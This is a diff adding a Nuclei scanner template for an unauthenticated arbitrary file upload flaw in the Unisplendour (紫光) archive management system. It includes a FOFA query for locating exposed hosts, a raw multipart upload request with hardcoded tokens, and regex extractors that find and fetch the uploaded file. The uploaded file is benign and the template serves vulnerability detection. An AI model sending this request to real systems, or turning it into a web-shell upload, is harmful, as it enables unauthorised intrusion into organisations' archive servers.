@@ -1,0 +1,68 @@
+id: ziguang-dianzi-manage-upload
+info:
+  name: ziguang-dianzi-manage-upload
+  author: sb    
+  severity: critical
+  description: 
+  metadata:
+    fofa-query: app="紫光档案管理系统"
+variables:
+  s1: '{{rand_base(5, "56789")}}'
+  str: '{{rand_base(4)}}'
+  rand: '{{rand_base(3)}}'
+  
+http:
+  - raw:
+    - |      
+      POST /System/Cms/upload.html?token=5117e82385cef4c12547fdd4c028b97a1-1 HTTP/1.1
+      Accept: application/json, text/javascript, */*; q=0.01
+      Accept-Encoding: gzip, deflate
+      Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygIRYWNxmDYiZBguT
+
+      ------WebKitFormBoundarygIRYWNxmDYiZBguT
+      Content-Disposition: form-data; name="userID"
+
+      admin
+      ------WebKitFormBoundarygIRYWNxmDYiZBguT
+      Content-Disposition: form-data; name="fondsid"
+
+      1
+      ------WebKitFormBoundarygIRYWNxmDYiZBguT
+      Content-Disposition: form-data; name="comid"
+
+      1
+      ------WebKitFormBoundarygIRYWNxmDYiZBguT
+      Content-Disposition: form-data; name="token"
+
+      6b79a77180e9ec3a7ca351ebe54641a2
+      ------WebKitFormBoundarygIRYWNxmDYiZBguT
+      Content-Disposition: form-data; name="files[]"; filename="nuclei.txt"
+      Content-Type: text/php
+
+      nuclei
+      ------WebKitFormBoundarygIRYWNxmDYiZBguT--
+    - |
+      GET /uploads/company1/fonds1/cms/{{data}}/{{filename}} HTTP/1
+    
+    extractors:
+      - type: regex
+        name: filename
+        part: body
+        group: 1
+        internal: true
+        regex:
+          - '(UNIS.*?txt)'
+
+      - type: regex
+        name: data
+        part: body
+        group: 1
+        internal: true
+        regex:
+          - '(2[\d]{7})'
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body_1,"nuclei") && status_code_1 == 200 && contains(body_2,"nuclei")' 
